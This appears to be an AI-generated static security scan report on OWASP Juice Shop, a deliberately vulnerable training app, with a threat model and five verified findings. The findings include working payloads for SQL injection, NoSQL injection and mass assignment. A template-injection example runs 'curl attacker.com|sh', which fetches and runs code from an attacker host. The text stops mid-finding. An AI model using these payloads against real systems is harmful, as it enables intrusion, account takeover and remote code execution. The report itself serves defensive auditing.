# Agentic SAST — juice-shop

## Summary
OWASP Juice Shop is an intentionally vulnerable training target, so essentially every finding is a true positive by design. The genuinely dangerous, internet-reachable issues are the unauthenticated SQL injection in login (auth bypass + credential dump), the JWT RS256/HS256 algorithm-confusion (forge any user/admin token with the public key), unauthenticated admin self-registration via mass assignment, and several post-auth RCE sinks (SSTI in username, chatbot template, notevil B2B eval). The most impactful real-world risk is not a single bug but the chains: SQLi+unsalted MD5 yields cracked credentials, the JWT alg-confusion gives outright pre-auth admin impersonation, and the unauthenticated password-reset brute force chain (rate-limit bypass + security-question disclosure) gives account takeover. Two file-server traversals rely on Windows backslash handling and are largely inert on the shipped Linux distroless image.

## Scan Metrics

- Scan ID: 2026-06-17T10:23:05Z__juice-shop
- Module: juice-shop
- Start: 2026-06-17T10:23:05Z
- End: 2026-06-17T11:35:23Z
- Duration (sec): 4338
- Files in scope: 636
- Files analyzed (unique): 545
- Coverage: 85.7%
- Chunks: 584 (risk=29, catch-all=125, specialist=430)
- Tokens (prompt): 7330213
- Tokens (completion): 1143729
- Tokens (total): 8473942

- Folders scanned: 114
### Tokens by Phase

_Prompt = fresh + cache-write (billable). Cache-read shown separately, NOT included in totals._

| Phase | Calls | Prompt | Completion | Total | % | Cache-read (excl.) |
|---|---:|---:|---:|---:|---:|---:|
| s4-deepdive | 583 | 6,095,168 | 790,826 | 6,885,994 | 81.3 | 0 |
| s6-verify | 87 | 1,056,715 | 304,708 | 1,361,423 | 16.1 | 10,466,846 |
| s5-prefilter | 1 | 37,639 | 18,443 | 56,082 | 0.7 | 0 |
| s1-preprocess | 1 | 47,548 | 7,162 | 54,710 | 0.6 | 264,498 |
| s3-decompose | 1 | 34,500 | 4,670 | 39,170 | 0.5 | 0 |
| s7-dedup | 1 | 24,857 | 10,807 | 35,664 | 0.4 | 0 |
| unlabeled | 1 | 19,889 | 4 | 19,893 | 0.2 | 0 |
| s2-threatmodel | 1 | 7,706 | 5,712 | 13,418 | 0.2 | 0 |
| s1-autoexclude | 1 | 6,191 | 1,397 | 7,588 | 0.1 | 0 |

### Language LOC Coverage

| Language | LOC in scope | LOC scanned | Coverage % |
|---|---:|---:|---:|
| javascript | 329 | 329 | 100.0 |
| other | 16351 | 10279 | 62.9 |
| solidity | 552 | 552 | 100.0 |
| typescript | 22633 | 22633 | 100.0 |
| web-template | 4826 | 4826 | 100.0 |

## Scan Health

- ⚠️ Degraded coverage: 1/584 deep-dive chunk(s) failed or timed out — their findings are absent from this report.
- Recoverable errors logged by stage: s4=2
- Full error log: `juice-shop_20260617T102305Z_errors.jsonl`

## Threat Model

### System context

OWASP Juice Shop v19.2.1 is an intentionally vulnerable web application built on Node.js/Express with a TypeScript backend and an Angular frontend. It models an e-commerce 'juice shop' with user accounts, product catalog/search, shopping baskets, orders (including B2B), feedback, file uploads, a chatbot, and Web3/Solidity contract components. It is distributed as a CLI/npm package and a distroless Docker image exposing port 3000, run by security trainers, CTF participants, and pentesters as a deliberate target.

### Assets

| Asset | Sensitivity | Description |
|---|---|---|
| User credentials & accounts | high | User table with email/password (MD5-hashed), profiles, roles (admin/customer/deluxe) |
| JWT session tokens | critical | RS256 JWTs used for authentication; signing key material in encryptionkeys/ |
| Application database | high | Sequelize/SQLite relational store (Users, Products, Baskets, Feedback) plus NeDB orders collection |
| Server file system & secrets | critical | Encryption keys, log files, ftp/ files, config files, source readable by node process |
| Process integrity / RCE surface | critical | Server-side code execution context via eval/vm/template rendering sandboxes |
| Service availability | medium | Express server responsiveness for training/CTF use |
| Order & B2B data | medium | Customer orders, B2B order payloads, delivery info |
| Internal network resources | high | Cloud metadata endpoints / internal services reachable via server-side fetch |

### Trust boundaries

- **routes/login.ts::login** — unauth network → SQL query construction / auth logic → User credentials & accounts, Application database, JWT session tokens
- **routes/search.ts::searchProducts** — unauth network → SQL query construction → Application database, User credentials & accounts
- **routes/trackOrder.ts::trackOrder** — unauth network → NoSQL (NeDB) query → Order & B2B data, Application database
- **routes/captcha.ts::captchas** — unauth network → server-side eval → Process integrity / RCE surface, Service availability
- **routes/redirect.ts::performRedirect** — unauth network → redirect allowlist → Service availability
- **routes/vulnCodeFixes.ts::serveCodeFixes/checkCorrectFix** — unauth network → challenge-fix file/logic → Server file system & secrets, Service availability
- **routes/vulnCodeSnippet.ts::serveCodeSnippet/checkVulnLines** — unauth network → challenge-snippet file/logic → Server file system & secrets, Service availability
- **server.ts::finale.resource (auto CRUD /api/*)** — unauth/auth network → auto-exposed ORM CRUD → Application database, User credentials & accounts, Order & B2B data
- **routes/b2bOrder.ts::b2bOrder** — authenticated network → notevil-sandboxed eval → Process integrity / RCE surface, Order & B2B data
- **routes/chatbot.ts::process** — authenticated network → NLP/template processing → Process integrity / RCE surface, User credentials & accounts
- **routes/dataErasure.ts::router.post /** — authenticated network → res.render layout param (template/LFI) → Server file system & secrets, Process integrity / RCE surface
- **routes/profileImageUrlUpload.ts::profileImageUrlUpload** — authenticated network → server-side fetch(url) (SSRF) → Internal network resources, Server file system & secrets
- **routes/userProfile.ts::getUserProfile** — authenticated network → username template eval (SSTI) → Process integrity / RCE surface, User credentials & accounts
- **routes/fileUpload.ts::handleXmlUpload/handleYamlUpload/handleZipFileUpload** — unauth network → XML/YAML/ZIP deserialization → Server file system & secrets, Process integrity / RCE surface, Service availability
- **routes/fileServer.ts::servePublicFiles** — unauth network → file path resolution → Server file system & secrets
- **routes/keyServer.ts::serveKeyFiles** — unauth network → file path resolution → Server file system & secrets, JWT session tokens
- **routes/logfileServer.ts::serveLogFiles** — unauth network → file path resolution → Server file system & secrets
- **routes/quarantineServer.ts::serveQuarantineFiles** — unauth network → file path resolution → Server file system & secrets
- **lib/security (JWT authorize/verify)** — unauth network → authentication/authorization decision → JWT session tokens, User credentials & accounts, Application database

### Ranked threats

| ID | Threat | Actor | Surface | Asset | Impact | Likelihood | Controls |
|---|---|---|---|---|---|---|---|
| T1 | Remote code execution via SSTI in the username field rendered through server-side eval in user profile | remote_auth | routes/userProfile.ts::getUserProfile | Process integrity / RCE surface | critical | likely | none (intentional) |
| T2 | Sandbox-escape RCE through notevil-evaluated B2B order payload executing arbitrary server code | remote_auth | routes/b2bOrder.ts::b2bOrder | Process integrity / RCE surface | critical | likely | notevil sandbox (bypassable) |
| T3 | RCE/DoS via eval of attacker-controlled captcha arithmetic expression | remote_unauth | routes/captcha.ts::captchas | Process integrity / RCE surface | critical | possible | none (intentional) |
| T4 | Authentication bypass and credential dump via SQL injection / UNION in raw login query | remote_unauth | routes/login.ts::login | User credentials & accounts | critical | almost_certain | none (raw string-concatenated SQL, intentional) |
| T5 | JWT forgery via RS256/HS256 algorithm-confusion since expressJwt is configured with the public key as the verification secret | remote_unauth | lib/security (JWT authorize/verify) | JWT session tokens | critical | likely | RS256 configured but public key reused as secret |
| T6 | Server-side template injection / LFI via dataErasure layout parameter passed to res.render, leading to RCE or secret file disclosure | remote_auth | routes/dataErasure.ts::router.post / | Server file system & secrets | critical | possible | weak substring blocklist (ftp/ctf.key/encryptionkeys) |
| T7 | Arbitrary file write / RCE via Zip-Slip path traversal in ZIP upload handler with weak path.resolve check | remote_unauth | routes/fileUpload.ts::handleXmlUpload/handleYamlUpload/handleZipFileUpload | Server file system & secrets | critical | possible | weak includes(path.resolve('.')) check |
| T8 | Disclosure of encryption/signing keys via path traversal or poison-null-byte against the key file server | remote_unauth | routes/keyServer.ts::serveKeyFiles | JWT session tokens | critical | possible | none (intentional) |
| T9 | Database extraction (e.g. all product/feedback/user rows) via SQL injection in product search query | remote_unauth | routes/search.ts::searchProducts | Application database | high | almost_certain | none (raw concatenated SQL, intentional) |
| T10 | Mass assignment / unauthorized CRUD (e.g. self-promote to admin, read others' data) via finale auto-exposed /api/* endpoints with weak guards | remote_auth | server.ts::finale.resource (auto CRUD /api/*) | User credentials & accounts | high | likely | selective isAuthorized/denyAll guards only |
| T11 | SSRF to cloud metadata / internal services via attacker-supplied profile image URL fetched server-side | remote_auth | routes/profileImageUrlUpload.ts::profileImageUrlUpload | Internal network resources | high | likely | none (intentional) |
| T12 | NoSQL $where injection in order tracking enabling data exfiltration or DoS via JS evaluation in NeDB | remote_unauth | routes/trackOrder.ts::trackOrder | Order & B2B data | high | likely | none (intentional) |
| T13 | XXE / billion-laughs entity expansion via XML upload reading local files or exhausting memory | remote_unauth | routes/fileUpload.ts::handleXmlUpload/handleYamlUpload/handleZipFileUpload | Server file system & secrets | high | possible | vm-wrapped libxml parsing (intentional) |
| T14 | YAML-bomb denial of service exhausting CPU/memory through js-yaml parsing of malicious upload | remote_unauth | routes/fileUpload.ts::handleXmlUpload/handleYamlUpload/handleZipFileUpload | Service availability | high | possible | vm wrapper (intentional) |
| T15 | Path traversal / poison-null-byte disclosure of arbitrary server files via public file server | remote_unauth | routes/fileServer.ts::servePublicFiles | Server file system & secrets | high | possible | none (intentional) |
| T16 | Disclosure of sensitive log contents (tokens, internal data) via traversal against the log file server | remote_unauth | routes/logfileServer.ts::serveLogFiles | Server file system & secrets | high | possible | none (intentional) |
| T17 | Disclosure of quarantined upload contents or traversal to other files via quarantine file server | remote_unauth | routes/quarantineServer.ts::serveQuarantineFiles | Server file system & secrets | high | possible | none (intentional) |
| T18 | Source/secret disclosure via path traversal in code-fix file serving endpoint | remote_unauth | routes/vulnCodeFixes.ts::serveCodeFixes/checkCorrectFix | Server file system & secrets | medium | possible | none |
| T19 | Source/secret disclosure via path traversal or key parameter in code-snippet serving endpoint | remote_unauth | routes/vulnCodeSnippet.ts::serveCodeSnippet/checkVulnLines | Server file system & secrets | medium | possible | none |
| T20 | Open redirect / phishing pivot by bypassing the redirect allowlist regex to reach attacker-controlled site | remote_unauth | routes/redirect.ts::performRedirect | Service availability | medium | likely | allowlist regex (bypassable, intentional) |
| T21 | Stored XSS or info-leak via chatbot processing of unsanitized user input/template, impacting other users | remote_auth | routes/chatbot.ts::process | User credentials & accounts | medium | possible | none (intentional) |
| T22 | Offline password cracking after DB compromise due to fast unsalted MD5 password hashing | remote_unauth | routes/login.ts::login | User credentials & accounts | medium | likely | MD5 only (intentional weak crypto) |

### Open questions

- Is the instance exposed to the public internet or run only in isolated training/CTF labs?
- Is there an upstream WAF, reverse proxy, or egress filtering that constrains SSRF and injection reachability?
- Are the encryptionkeys/ private keys the real signing keys used at runtime, and are they rotated per deployment?
- What network segmentation exists around the container (cloud metadata endpoint reachability for SSRF)?
- Is the deliberately-vulnerable nature acceptable risk (training) or is any instance handling real user data?

## Verification
- Raw findings (pre-verification): 184
- True positives (verified): 64
- False positives (dropped): 21
- Verifier errors (excluded — undetermined, not confirmed clean): 0
- Duplicates collapsed (all passes): 26
- Verification precision: 34.8%

## Findings (64)

### 1. [CRITICAL] Unauthenticated SQL injection in login email field
**Class:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
**CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection) - https://cwe.mitre.org/data/definitions/89.html
**File:** `routes/login.ts:31-31`
**CVSS 3.1:** **9.1** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.99 (1 run agreed)

#### Description
The Express login handler builds a raw SQL string by interpolating `req.body.email` directly into the query via a template literal with no escaping, parameterization, or validation. `req.body` is fully attacker-controlled JSON POSTed to the login endpoint. The query is executed with `models.sequelize.query(...)`, so any SQL meta-characters in the email break out of the string literal. The password portion is hashed before interpolation, but the email is not protected at all, allowing the attacker to comment out the password/deletedAt checks.

#### Impact
An anonymous attacker can bypass authentication and log in as any user (including admin) or dump the entire Users table. Every account in the shop is compromised because the email value is concatenated directly into a raw SQL statement.

#### Exploit scenario
Attacker POSTs `{"email":"' OR 1=1--","password":"x"}` to `/rest/user/login`. The query becomes `SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = ...`, returning the first user row (with `plain: true`) and issuing a valid auth token for that account. By ordering the result the attacker can authenticate as admin without credentials.

#### Preconditions
- Network access to the login endpoint (no authentication required)

```
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
```

#### How to fix
Never interpolate request data into raw SQL. Replace the template-literal query with a parameterized query using Sequelize replacements/bind parameters (e.g. `sequelize.query('SELECT * FROM Users WHERE email = $email AND password = $pw AND deletedAt IS NULL', { bind: { email: req.body.email, pw: security.hash(req.body.password) }, model: UserModel, plain: true })`), or use `UserModel.findOne({ where: { email, password } })`.

**Exploitability:** Unauthenticated SQLi in login email comments out password/deletedAt checks → auth bypass AND credential dump. Zero preconditions. CVSS 9.8 Critical.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 10/10) — raw unescaped req.body.email interpolated into sequelize.query on an unauthenticated /rest/user/login route; classic auth-bypass SQLi, no upstream control

**Verification**

**A. Sink confirmed** — `routes/login.ts:31` interpolates `req.body.email` directly into a raw SQL string passed to `models.sequelize.query(...)` with `{ plain: true }`. No escaping, no parameterization. Password is MD5-hashed (`insecurity.ts:37`) before interpolation, but **email is raw**.

**B. External entry point** — `server.ts:549`: `app.post('/rest/user/login', login())`. Unauthenticated network endpoint. Body parsers mounted globally (`server.ts:281/288`). No auth middleware in front of `/rest/user/login` (the `isAuthorized`/`denyAll` gates cover other routes only).

**C. Defenses sought** — `verifyPreLoginChallenges` (line 55) only does equality checks for challenge detection; no validation/sanitization of email. No allow-list, no length/type constraint, no SQL escaping anywhere in the path. Sequelize `.query()` with a template literal bypasses parameterization entirely.

**D. No defense to probe** — the path is fully open.

**Exploit verified plausible**: `{"email":"' OR 1=1--","password":"x"}` yields `SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = ...` → returns first row, `afterLogin` issues a valid JWT. Auth bypass + full DB read via UNION. This is the canonical OWASP Juice Shop login SQLi (intentional, but a real exploitable vuln).

Impact: complete auth bypass (login as admin), and the `SELECT *` raw query enables UNION-based exfiltration of the Users table → high confidentiality/integrity.

### 2. [CRITICAL] Unauthenticated NoSQL ($where JS) injection in order tracking
**Class:** CWE-943
**CWE:** CWE-943 - https://cwe.mitre.org/data/definitions/943.html
**File:** `routes/trackOrder.ts:12-15`
**CVSS 3.1:** **9.1** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
req.params.id enters at line 12. When the reflectedXssChallenge is enabled (default in Juice Shop), id is only passed through utils.trunc(...,60) which truncates but performs NO character filtering. That value is then concatenated directly into a MongoDB server-side JavaScript predicate at line 15: `$where: this.orderId === '${id}'`. The single quotes can be closed and arbitrary boolean JS appended, turning the equality check into an attacker-controlled expression evaluated per-document.

#### Impact
An anonymous attacker can inject arbitrary JavaScript into the MongoDB $where clause, allowing them to bypass the orderId match and dump every order in the collection, or run boolean/timing oracles to exfiltrate arbitrary order data. Affects all users' order records.

#### Exploit scenario
Attacker requests GET /rest/track-order/' || 'a'=='a (URL-encoded), producing the predicate `this.orderId === '' || 'a'=='a'` which is true for every document. The endpoint returns the full orders collection in result.data, exposing all customers' orderIds and order contents. Variations like `'; while(true){}; var x='` enable JS-based DoS/timing oracles.

#### Preconditions
- reflectedXssChallenge enabled (default Juice Shop configuration) so the non-filtering trunc path is taken

```
const id = !utils.isChallengeEnabled(challenges.reflectedXssChallenge) ? String(req.params.id).replace(/[^\w-]+/g, '') : utils.trunc(req.params.id, 60)
...
db.ordersCollection.find({ $where: `this.orderId === '${id}'` })
```

#### How to fix
Never build $where queries from user input. Replace the $where template with a parameterised structural query, e.g. db.ordersCollection.find({ orderId: id }) so the value is treated as data; also reject ids not matching /^[\w-]+$/ unconditionally at line 12 rather than only when the XSS challenge is disabled.

**Exploitability:** Unauthenticated NoSQL $where JS injection in order tracking; data exfil and DoS via per-document JS. CVSS 8.6 High.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — unauthenticated `$where` JS injection; `trunc` does no char filtering on the default challenge-enabled path, MarsDB `Function()`-evals the predicate, exposing all orders + JS DoS

**Verification Summary**

**A. Sink confirmed.** `routes/trackOrder.ts:15` concatenates `id` directly into `{ $where: \`this.orderId === '${id}'\` }`.

**B. Entry point confirmed.** Registered at `server.ts:570` — `app.get('/rest/track-order/:id', trackOrder())`. No `isAuthorized()`/`denyAll()` middleware covers this path (auth gates apply to `/rest/basket`, `/api/*` etc., not `/rest/track-order`). **Unauthenticated, network-reachable.**

**C. Defences probed — none hold.**
- `utils.trunc(req.params.id, 60)` (utils.ts:59) only strips CR/LF and truncates to 60 chars — **no character filtering**. Quotes pass through. This is the path taken when `reflectedXssChallenge` is enabled (Juice Shop default).
- The sanitised branch `replace(/[^\w-]+/g, '')` is only reached when the challenge is *disabled*, which is not the default.

**D. Sink semantics confirmed.** The DB is MarsDB (not MongoDB as the scanner claimed), but `node_modules/marsdb/lib/DocumentMatcher.js:375` does `Function('obj', 'return ' + selectorValue)` and calls it per document — i.e. it genuinely `eval`s the `$where` string as JavaScript. The scanner's "MongoDB" label is a minor mis-read of the engine, but the injection class (`$where` server-side JS injection) and mechanism are exactly as described.

**Exploitability:**
- `GET /rest/track-order/'||'1'=='1` → predicate `this.orderId === ''||'1'=='1'` → true for every doc → returns the **entire orders collection** (all customers' orders). Confirmed by the planted `noSqlOrdersChallenge` solveIf on `result.data.length > 1`.
- 60-char budget easily fits a JS-DoS payload (e.g. `';while(true){};'`) — single-request, input-driven compute blowup (in scope, not pure volumetric DoS), giving availability impact.

This is an intentional planted challenge, but per the architecture notes these deliberate vulns are real, exploitable, in-scope findings. Confidentiality is full (all orders); integrity none (`find` is read-only); availability high (infinite-loop predicate). Same vulnerable/impacted component → Scope Unchanged.

### 3. [CRITICAL] Remote code execution via attacker-controlled eval of order data
**Class:** CWE-94: Improper Control of Generation of Code (Code Injection)
**CWE:** CWE-94: Improper Control of Generation of Code (Code Injection) - https://cwe.mitre.org/data/definitions/94.html
**File:** `routes/b2bOrder.ts:16-20`
**CVSS 3.1:** **9.9** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The middleware reads body.orderLinesData directly from the HTTP request body (untrusted network input) at line 16 with no validation, type-checking, or sanitization. It places that raw string into a sandbox object and executes 'safeEval(orderLinesData)' via vm.runInContext at line 20. The vm timeout (2000ms) only mitigates infinite-loop denial-of-service, not code execution. The notevil 'safeEval' interpreter parses and evaluates the attacker string and is susceptible to known sandbox-escape payloads (e.g. abusing constructor chains / prototype access) that reach the real global scope and Node internals. There is no guard between source and sink: the only branch condition (isChallengeEnabled) is operator/server state, not a sanitizer.

#### Impact
An attacker who can POST to the B2B order endpoint controls the string fed to safeEval inside a vm context. Through known sandbox-escape techniques in the notevil interpreter, this yields arbitrary JavaScript execution in the server process, allowing data theft, file access, or full host compromise. All users of the deployed instance are affected.

#### Exploit scenario
Attacker sends POST /b2b/v2/orders with JSON body {"orderLinesData": "<notevil sandbox-escape payload returning a reference to process.mainModule.require('child_process').execSync('id')>"}. notevil evaluates the expression, the escape reaches the Node runtime, and the attacker executes arbitrary OS commands on the server. A simpler payload "while(true){}" triggers the timeout path, confirming the eval is live and attacker-driven.

#### Preconditions
- The rceChallenge or rceOccupyChallenge is enabled (default in Juice Shop deployments)
- Attacker can reach the B2B order route over the network

```
const orderLinesData = body.orderLinesData || ''
try {
  const sandbox = { safeEval, orderLinesData }
  vm.createContext(sandbox)
  vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })
```

#### How to fix
Never evaluate request-derived strings. Remove the safeEval/vm.runInContext path and replace orderLinesData processing with a strict schema parser (e.g. JSON.parse + zod validation) that returns structured data without executing it. The security property: no value derived from body may reach any eval/vm/Function sink.

**Exploitability:** Post-auth (any user) notevil-sandboxed eval of order data; sandbox is escapable to Node internals → RCE, scope change. CVSS 9.9 Critical. One precondition (low-priv session).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — untrusted body.orderLinesData reaches a live notevil/vm eval sink, network-reachable behind only open-registration auth; full OS-RCE relies on a notevil escape (SCA territory), but the unsanitized-eval injection itself is real and confirmed

**Investigation**

**A. The sink (verified, `routes/b2bOrder.ts:14-31`):**
The middleware reads `body.orderLinesData` (line 16) straight from the request body with no validation, then runs `safeEval(orderLinesData)` inside `vm.runInContext` (line 20). The sandbox object contains only `{ safeEval, orderLinesData }` — no `process`, no `require`. `safeEval` is `notevil`'s interpreter (`notevil ^1.3.3`, confirmed in `package.json:167`). The two branches only set challenge state; neither sanitizes. Untrusted string → eval sink, no guard. Confirmed.

**B. Call chain to entry point:**
`server.ts:72` imports it; `server.ts:598` mounts `app.post('/b2b/v2/orders', b2bOrder())`. This is a real network entry point. Reachable.

**C. Defences:**
- `server.ts:390` — `app.use('/b2b/v2', security.isAuthorized())` gates the route. `isAuthorized` = `expressJwt({ secret: [REDACTED-SECRET] })` (`insecurity.ts:48`). So a valid JWT is required → **PR:L**, not PR:N. But Juice Shop registration is open (`POST /api/Users`), so any attacker can self-register and obtain a token. The auth gate does not close the path.
- `isChallengeEnabled` is operator state, not a sanitizer; default-enabled in deployments.
- The 2000ms `vm` timeout bounds only the infinite-loop/DoS path, not evaluation.

**D. Probing the scanner's specific claim:**
The scanner claims OS command execution via `process.mainModule.require('child_process')`. That is **not** what this code grants on its own: `notevil` is a deliberately *sandboxed AST interpreter* and the `vm` context exposes no Node globals. Reaching `child_process` would require a `notevil` sandbox-escape — i.e. a *library-version* vulnerability, which belongs to the SCA/dependency pipeline (out-of-scope D), not this code-level scan. The code-level, demonstrable impact is: arbitrary attacker-controlled code executed in the interpreter, plus a DoS/occupy path (the intended `rceChallenge`/`rceOccupyChallenge`).

**Conclusion:** The scanner over-claims the *mechanism* (full OS RCE depends on a notevil CVE handled elsewhere), but the core finding — untrusted network input flowing unsanitized into a live `eval` sink, reachable over the network behind only an open-registration auth gate — is real and is a deliberately planted injection. The class (injection / untrusted eval) and the reachability are correct. That meets the TRUE_POSITIVE bar: external entry reached, no defence closes it, impact (attacker-driven code evaluation + DoS) is real, not hypothetical.

CVSS scored against the claimed RCE impact per instructions (PR:L because the route sits behind `isAuthorized`; S:C for the claimed sandbox/host crossing).

### 4. [CRITICAL] Server-side template injection via chatbot username leads to RCE
**Class:** CWE-94: Improper Control of Generation of Code (Code Injection)
**CWE:** CWE-94: Improper Control of Generation of Code (Code Injection) - https://cwe.mitre.org/data/definitions/94.html
**File:** `routes/chatbot.ts:146-153`
**CVSS 3.1:** **9.9** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.85 (1 run agreed)

#### Description
In setUserName, the raw request value req.body.query is written to the user record (userModel.update({ username: req.body.query })) and then passed unsanitized to bot.addUser(`${updatedUser.id}`, req.body.query). The juicy-chat-bot engine substitutes the stored username into its greeting/response templates and evaluates the resulting string as a template (effectively eval/Function over interpolated `${...}` expressions). Because no validation, encoding, or allow-list is applied to the username between the HTTP boundary and the template engine, an attacker-supplied expression such as `${global.process.mainModule.require('child_process').execSync('id')}` is executed when bot.greet(`${updatedUser.id}`) is later invoked (line 153, and on subsequent /chatbot requests via processQuery/status). Entry is process() -> action 'setname' -> setUserName, reachable by any logged-in user.

#### Impact
Any authenticated user can set their chatbot username to a template-literal payload that juicy-chat-bot evaluates when building the greeting, allowing arbitrary JavaScript/Node code execution on the server host. This compromises the entire application and underlying container.

#### Exploit scenario
An authenticated attacker POSTs to the chatbot endpoint with {"action":"setname","query":"${global.process.mainModule.require('child_process').execSync('curl attacker.com|sh')}"}. The string is stored as the username and inserted into the chatbot greeting template. When the bot generates the greeting (immediately in the response, or on a later query/status call) the embedded expression is evaluated by juicy-chat-bot, executing the attacker's shell command on the server. The attacker gains remote code execution.

#### Preconditions
- Attacker holds any valid authenticated session (JWT) — registration is open
- Chatbot is initialized (bot != null)

```
const updatedUser = await userModel.update({ username: req.body.query })
...
bot.addUser(`${updatedUser.id}`, req.body.query)
res.status(200).json({
  action: 'response',
  body: bot.greet(`${updatedUser.id}`),
  token: ...
})
```

#### How to fix
Treat the username as untrusted data, not template source: validate req.body.query against a strict allow-list (e.g. alphanumeric/space, bounded length) before userModel.update and bot.addUser at routes/chatbot.ts:146-150, and ensure the chatbot engine renders names as inert text rather than evaluating interpolation.

**Exploitability:** Stored username drives juicy-chat-bot template eval → child_process RCE reachable by any logged-in user, scope change. CVSS 9.6 Critical.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — req.body.query flows unsanitized from an authenticated network route into bot.addUser, which string-interpolates it into JS eval'd by factory.run() (vm2); no upstream validation, and vm2 3.9.17 has public sandbox escapes enabling host RCE.

I have enough evidence. Let me confirm the findings:

**A. The sink (line 146–153):** Confirmed verbatim. `req.body.query` → `userModel.update({username})` → `bot.addUser(updatedUser.id, req.body.query)`.

**The engine:** `Bot.addUser(token, name)` runs `this.factory.run(\`users.addUser("${token}", "${name}")\`)` — the username is **string-interpolated directly into JS source that is `eval`'d inside a vm2 VM** (factory.js). So `req.body.query` containing a quote-break payload like `"); <code>; ("` executes arbitrary JS in the sandbox.
- Minor scanner inaccuracy: `greet`/`render` use `.replace()` (not eval), so RCE doesn't trigger via greet. But the *actual* eval sink is `addUser` on line 150, which the finding correctly cites. The class (code injection) and location are right.

**B. Entry point:** `app.post('/rest/chatbot/respond', chatbot.process())` (server.ts:585). `process()` → action `setname` → `setUserName`. Reachable over the network by any holder of a valid JWT; registration is open. External, lower-privileged entry point confirmed.

**C. Defences:** None. No validation, encoding, allow-list, or length/type constraint is applied to `req.body.query` between the HTTP boundary and `factory.run()`. The only isolation is vm2 — but vm2 **3.9.17** (pinned in package.json) has public, weaponized sandbox-escape exploits, and this is a deliberate Juice Shop RCE challenge. Even absent host escape, attacker-controlled code executes in the VM.

**D.** vm2 version vulnerability would normally be SCA's job, but here the injection itself (attacker-controlled JS into `factory.run`) is the app-layer bug — squarely in scope.

This is a real, externally-reachable code-injection sink with no neutralising control. The interpolation into eval'd VM code crosses into the JS execution boundary (and via known vm2 escapes, to the host).

### 5. [CRITICAL] Mass-assignment lets anonymous user self-register as admin
**Class:** CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
**CWE:** CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes - https://cwe.mitre.org/data/definitions/915.html
**File:** `server.ts:374-388`
**CVSS 3.1:** **9.8** (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *admin/privileged role required*
**Confidence:** 0.90 (1 run agreed)
**Also at:** `models/user.ts:76-96`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
POST /api/Users is the finale-rest auto-CRUD create endpoint (autoModels entry 'User', server.ts:446, resource built at server.ts:463-468). The pre-hooks at server.ts:374-388 only trim email/password and detect (not block) admin registration via verify.registerAdminChallenge(). finale maps the entire request body onto UserModel attributes. The UserModel `role` column accepts 'customer','deluxe','accounting','admin' (models/user.ts:79-81) and is fully writable, so a request body containing role:'admin' is persisted as an admin account. No guard rejects the field — verify.registerAdminChallenge() merely flags it.

#### Impact
Any unauthenticated visitor can create an account with role 'admin' (or 'accounting'/'deluxe') by adding a single field to the registration body, gaining full administrative access to the application and all other users' data.

#### Exploit scenario
Attacker sends POST /api/Users with JSON {"email":"x@x.io","password":"x","passwordRepeat":"x","role":"admin"}. The user is created with role=admin. The attacker logs in and now passes security.isAuthorized()-gated admin views and can read all user rows via GET /api/Users.

#### Preconditions
- Registration endpoint reachable (default)

```
app.post('/api/Users', (req, res, next) => { ... }) // only trims, never strips role
app.post('/api/Users', verify.registerAdminChallenge()) // detects, does not block
```

#### How to fix
Strip privileged attributes from create input: add role to the User resource excludeAttributes / a finale create.write.before hook that forces role='customer', or validate the body with a schema that rejects role. Fix at the autoModels User entry (server.ts:446) or the POST /api/Users middleware chain (server.ts:374-388).

**Exploitability:** Unauthenticated POST /api/Users accepts role:'admin' via mass assignment; pre-hooks only flag, don't block. Pre-auth privilege escalation. CVSS 9.8 Critical.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — anonymous POST /api/Users has no auth gate and no field guard; role:'admin' passes the isIn validator and is persisted, yielding admin privilege escalation. Only a challenge-solver "detects" it.

**Verification Analysis**

**A. The sink (server.ts:374-388)** — Confirmed. The pre-hook only validates presence and trims `email`/`password`/`passwordRepeat`. It never inspects or strips `role`. `verify.registerAdminChallenge()`, `passwordRepeatChallenge()`, `emptyUserRegistration()` follow — all flag/detect only.

**B. External entry point** — Confirmed reachable unauthenticated. Lines 329-333 gate only `GET /api/Users` and `/api/Users/:id` with `isAuthorized()`/`denyAll()`. There is **no** `security.isAuthorized()` / `denyAll()` on `POST /api/Users`. The finale auto-CRUD `create` (server.ts:443-468) handles it. Anonymous POST reaches the create with the full request body mapped onto `UserModel`.

**C. Defences probed:**
